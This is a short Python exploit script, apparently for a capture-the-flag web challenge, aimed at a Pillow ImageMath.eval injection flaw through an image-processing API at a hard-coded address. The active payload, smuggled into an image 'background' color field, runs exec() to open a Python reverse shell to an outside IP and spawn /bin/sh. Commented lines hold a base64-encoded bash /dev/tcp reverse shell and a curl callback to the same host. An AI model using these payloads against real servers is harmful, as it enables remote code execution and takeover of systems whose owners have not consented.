import requests as rq
from typing import List, Union
from base64 import b64encode, b64decode
import json

# vuln: https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#restrict-builtins-available-to-imagemath-eval

url = 'http://46.101.30.188:30411'
#url = 'http://127.0.0.1:1337'


def upload_img(img_path: str, color: List[Union[int, int, int]]):
    with open(img_path, 'rb') as f:
        img = f.read()
    img = b64encode(img).decode()
    data = {
        'image': img,
        'background': color
    }
    data = json.dumps(data)

    print('before request')
    res = rq.post(f'{url}/api/alphafy', data=data,
                  headers={'Content-Type': 'application/json'})
    print(res)
    print(res.text)
    return res.text


upload_img(
    './us.png',
    [
        #'''exec("__import__('os').system('echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTE0LjMyLjcxLjE5NS85MDAwIDA+JjEnCg== | base64 -d | /bin/bash')") or 30''',
        '''exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("114.32.71.195",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")') or 30''',
        #'''exec('os.system("curl http://114.32.71.195:9000")')''',
        2,
        3
    ]
)
